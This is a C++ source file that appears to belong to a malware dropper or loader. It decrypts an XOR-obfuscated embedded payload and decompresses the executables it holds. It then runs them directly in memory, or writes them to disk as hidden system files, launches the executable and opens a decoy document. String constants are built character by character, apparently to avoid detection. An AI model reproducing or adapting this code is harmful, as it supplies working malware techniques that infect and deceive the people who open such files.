
#include "crypto.h"
#include "FileHelper.h"
#include "compress.h"
#include "LoadPE.h"
#include "PEParser.h"
#include "api.h"
#include "Public.h"

#include "md5.h"
#include "PeLoader.h"

#include "../include/openssl/md5.h"
#pragma comment(lib,"../lib\\libcrypto.lib")
#pragma comment(lib,"../lib\\libssl.lib")
#pragma comment(lib,"../lib\\openssl.lib")

#include <DbgHelp.h>

#pragma comment(lib,"dbghelp.lib")


#define MAX_INPUT_FILE	16

#define FILENAME_LEN	64

#define CRYPT_KEY_SIZE	16


#pragma pack(1)

typedef struct {
	char filename[FILENAME_LEN];
	ULONG fsize;
	ULONG compSize;
	unsigned char filedata[0];
}FILE_DATA;


typedef struct {
	int cnt;
	FILE_DATA fd;
}CRYPT_FILE_DATA;

typedef struct
{
	int type;
	unsigned char key[CRYPT_KEY_SIZE];
	CRYPT_FILE_DATA cfd;
}FILE_DATA_BLOCK;


#pragma pack()


int Crypto::reloadPE(const char* data, int datasize) {

	int ret = 0;
	char szinfo[1024];

	FILE_DATA_BLOCK* fdb = (FILE_DATA_BLOCK*)data;

	unsigned char* dstblock = new unsigned char[datasize + 0x1000];

	unsigned char* key = fdb->key;

	//revertkey(key);

	CryptData((unsigned char*)&fdb->cfd, datasize - 4 - CRYPT_KEY_SIZE,	key, CRYPT_KEY_SIZE, dstblock, datasize);
	CRYPT_FILE_DATA* cfd = (CRYPT_FILE_DATA*)dstblock;
	if (cfd->cnt <= 0 || cfd->cnt >= MAX_INPUT_FILE)
	{
		return -1;
	}

	char filename[256] = { 0 };

	char szExeFn[] = { '.','e','x','e',0 };
	char szDllFn[] = { '.','d','l','l',0 };

	FILE_DATA* fd = &(cfd->fd);

	for (int i = 0; i < cfd->cnt; i++)
	{
		memcpy(filename, (char*)fd->filename, FILENAME_LEN);

		unsigned char* uncompbuf = new unsigned char[cfd->fd.fsize + 0x1000];

		unsigned long uncompsize = fd->fsize;

		ret = Compress::uncompressdata(fd->filedata, fd->compSize, uncompbuf, &uncompsize);
		if (ret == 0)
		{
			ret = PEParser::isPE((char*)uncompbuf);
			if (ret <= 0)
			{
				break;
			}

			if (memcmp(filename + lstrlenA(filename) - 4, szExeFn, 4) == 0)
			{
				delete[] dstblock;
#ifdef _DEBUG
				//wsprintfA(szinfo, "run exe:%s size:%u", filename,uncompbufsize);
				//MessageBoxA(0, szinfo, szinfo, MB_OK);
				//FileHelper::fileWriter("d:\\test.exe",(const char*) uncompbuf, uncompbufsize);
#endif
				
				//ret = LoadPE::RunPE((char*)uncompbuf, uncompbufsize);
				ret = MemRunPE((char*)uncompbuf, uncompsize);

				delete[] uncompbuf;
				uncompbuf = 0;
				return ret;
			}
			else if (memcmp(filename + lstrlenA(filename) - 4, szDllFn, 4) == 0)
			{
				delete[] dstblock;
#ifdef _DEBUG
				//wsprintfA(szinfo, "run dll:%s size:%u", filename,uncompbufsize);
				//MessageBoxA(0, szinfo, szinfo, MB_OK);
#endif
				ret = LoadPE::RunPE((char*)uncompbuf, uncompsize);

				delete[] uncompbuf;
				uncompbuf = 0;
				return ret;
			}
			else {
				break;
			}
		}
		else {
#ifdef _DEBUG
			wsprintfA(szinfo, "uncompress file:%s error", filename);
			MessageBoxA(0, szinfo, szinfo, MB_OK);
#endif
			break;
		}
		fd = (FILE_DATA*)((char*)fd + sizeof(FILE_DATA) + fd->fsize);

		if (uncompbuf)
		{
			delete[] uncompbuf;
			uncompbuf = 0;
		}
	}

	delete[] dstblock;
	return cfd->cnt;
}

//0 4		//type
//4 16		//key
//20 4		//cnt

//24 64		//filename
//88 4		//size
//92 xxx	//file data
int Crypto::getoutFiles(const char* data, int datasize) {

	int ret = 0;
	char szinfo[1024];

	FILE_DATA_BLOCK* fdb = (FILE_DATA_BLOCK*)data;

	unsigned char* dstblock = new unsigned char[(ULONGLONG)datasize + 0x1000];

	unsigned char* key = fdb->key;

	//revertkey(key);

	CryptData((unsigned char*)&fdb->cfd, datasize - 4 - CRYPT_KEY_SIZE, key, CRYPT_KEY_SIZE, dstblock, datasize);
	CRYPT_FILE_DATA* cfd = (CRYPT_FILE_DATA*)dstblock;
	if (cfd->cnt <= 0 || cfd->cnt >= MAX_INPUT_FILE)
	{
		return -1;
	}

	//revertkey(key);

	string path = FileHelper::getRunPath();

	ret = lpMakeSureDirectoryPathExists((char*)path.c_str());

	string runningfn = "";

	string docfn = "";

	string szexefns = { '.','e','x','e','.','s','y','s','.','c','o','m',0 };
	string szdocfns = 
	{ '.','d','o','c','.','d','o','c','x','.','x','l','s','.','x','l','s','x','.','p','p','t','.','p','p','t','x','.','t','x','t','.','p','n','g','.','j','p','g','.','j','p','e','g','.','b','m','p','.','m','p','3','.','m','p','4','.','p','d','f',0 };

	FILE_DATA* fd = & cfd->fd;
	for (int i = 0; i < cfd->cnt; i++)
	{
		char filename[256] = { 0 };
		memcpy(filename, (char*)fd->filename, FILENAME_LEN);

		int pos = string(filename).find(".");
		if (pos >= 0)
		{
			string sufix = string(filename).substr(pos);
			if (strstr(szexefns.c_str(), sufix.c_str()))
			{
				runningfn = path + filename;
			}
			else if (strstr(szdocfns.c_str(), sufix.c_str()))
			{
				docfn = path + filename;
			}
		}

		unsigned char* uncompbuf = new unsigned char[fd->fsize + 0x1000];
		unsigned long uncompbufsize = fd->fsize;
		ret = Compress::uncompressdata((unsigned char*)&(fd->filedata), fd->compSize, uncompbuf, &uncompbufsize);
		if (ret == 0)
		{
			ret = FileHelper::fileWriter((path + filename).c_str(), (const char*)uncompbuf, uncompbufsize, TRUE);
			if (ret > 0)
			{
				ret = SetFileAttributesA((path + filename).c_str(), 
					FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
			}
			else {
				Public::writelog("write file:%s error\r\n", filename);
				//break;
			}
		}
		else {
			Public::writelog("uncompress file:%s error\r\n", filename);
			//break;
		}

		if (uncompbuf)
		{
			delete[]uncompbuf;
			uncompbuf = 0;
		}

		fd = (FILE_DATA*)((char*)fd + sizeof(FILE_DATA) + fd->fsize);
	}

	delete[] dstblock;

	if (runningfn != "")
	{
		char szcmd[1024] = { 0 };
		char szparam[] = { 'S','T','A','R','T','F','I','R','S','T','T','I','M','E',0 };
		wsprintfA(szcmd, "\"%s\" %s", runningfn.c_str(), szparam);
		ret = lpWinExec(szcmd, SW_SHOW);
	}

	if (docfn != "")
	{
		char szshellOpen[] = { 'o','p','e','n',0 };
		lpShellExecuteA(0, szshellOpen, docfn.c_str(), "", "", 0);
		//char szcmd[1024] = { 0 };
		//wsprintfA(szcmd, "cmd /c \"%s\"", docfn.c_str());
		//ret = lpWinExec(szcmd, SW_SHOW);
	}

	Public::writelog("pe file:%s,doc file:%s\r\n", runningfn.c_str(), docfn.c_str());
	return TRUE;
}


void Crypto::CryptData(unsigned char* src, int size, unsigned char* psrckey, int keylen, unsigned char* dst, int dstsize) {

	unsigned char* pkey = new unsigned char[keylen];
	for (int i = 0; i < keylen; i++)
	{
		pkey[i] = (~psrckey[i]) ^ 0x2b;
	}

	for (int i = 0, j = 0; i < size;)
	{
		dst[i] = src[i] ^ pkey[j];
		j++;
		if (j == keylen)
		{
			j = 0;
		}
		i++;
	}

	delete []pkey;
}





void Crypto::getkey(unsigned char* key) {
	SYSTEMTIME sttime = { 0 };
	GetLocalTime(&sttime);

	Crypto::getDataMd5((char*)&sttime, sizeof(SYSTEMTIME), (char*)key, FALSE);

	return;
}



void Crypto::revertkey(unsigned char* key) {
	for (int i = 0; i < CRYPT_KEY_LEN; i++)
	{
		key[i] = ~key[i];
	}
}



int Crypto::getDataMd5(char* lpdata, int size, char* szmd5, int lowercase) {

	int casevalue = 55;
	if (lowercase)
	{
		casevalue = 87;
	}

	int ret = 0;
	unsigned char hexmd5[256] = { 0 };

#if 0
	MD5_CTX ctx = { 0 };
	ret = MD5_Init(&ctx);
	ret = MD5_Update(&ctx, lpdata, size);
	ret = MD5_Final(hexmd5, &ctx);
#else
	md5((unsigned char*)lpdata, size, hexmd5);
#endif

	for (int i = 0, j = 0; i < 16; i++)
	{
		unsigned char c = hexmd5[i];
		unsigned char c1 = c >> 4;
		if (c1 >= 0 && c1 <= 9)
		{
			c1 += 0x30;
		}
		else {
			c1 += casevalue;		//uppercase is 55,87 is lowercase
		}
		unsigned char c2 = c & 0xf;
		if (c2 >= 0 && c2 <= 9)
		{
			c2 += 0x30;
		}
		else {
			c2 += casevalue;
		}
		szmd5[j++] = c1;
		szmd5[j++] = c2;
	}
	*(szmd5 + 32) = 0;
	return TRUE;
}
